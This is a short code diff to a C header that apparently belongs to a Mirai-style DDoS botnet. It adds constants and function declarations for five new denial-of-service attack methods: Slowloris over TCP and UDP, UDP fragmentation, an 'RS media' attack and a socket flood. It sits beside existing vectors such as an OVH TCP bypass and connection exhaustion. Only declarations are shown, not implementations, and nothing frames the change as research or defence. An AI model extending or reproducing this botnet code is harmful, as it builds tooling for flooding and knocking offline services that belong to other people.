@@ -46,6 +46,11 @@ typedef uint8_t ATTACK_VECTOR;
 #define ATK_VEC_OVHTCP 14
 #define ATK_VEC_TCP_HANDSHAKE 15
 #define ATK_VEC_CONN_EXHAUST 16
+#define ATK_VEC_SLOWLORIS_TCP 17
+#define ATK_VEC_SLOWLORIS_UDP 18
+#define ATK_VEC_UDP_FRAG 19
+#define ATK_VEC_RS_MEDIA 20
+#define ATK_VEC_SOCKET 21
 
 #define ATK_OPT_PAYLOAD_SIZE    0   // What should the size of the packet data be?
 #define ATK_OPT_PAYLOAD_RAND    1   // Should we randomize the packet data contents?
@@ -124,5 +129,10 @@ void attack_method_raw(uint8_t, struct attack_target *, uint8_t, struct attack_o
 void attack_method_ovhtcp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_tcp_handshake(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 void attack_tcp_connexhaust(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_slowloris_tcp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_slowloris_udp(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_udp_frag(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_rs_media(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
+void attack_socket_flood(uint8_t, struct attack_target *, uint8_t, struct attack_option *);
 static void add_attack(ATTACK_VECTOR, ATTACK_FUNC);
 static void free_opts(struct attack_option *, int);
